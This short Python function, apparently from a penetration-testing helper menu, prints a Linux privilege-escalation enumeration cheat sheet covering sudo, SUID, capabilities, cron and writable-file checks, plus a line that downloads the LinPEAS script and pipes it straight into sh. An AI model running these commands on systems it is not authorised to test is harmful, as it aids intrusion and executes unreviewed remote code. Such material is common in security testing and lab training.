def linux_privesc():
    print("""
=== Linux Privilege Escalation ===

[System]
id
uname -a
cat /etc/os-release

[Sudo]
sudo -l

[SUID]
find / -perm -4000 2>/dev/null

[Capabilities]
getcap -r / 2>/dev/null

[Cron]
crontab -l
ls -la /etc/cron*

[Writable Files]
find / -writable 2>/dev/null

[LinPEAS]
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
""")
    input("Press Enter to return...")
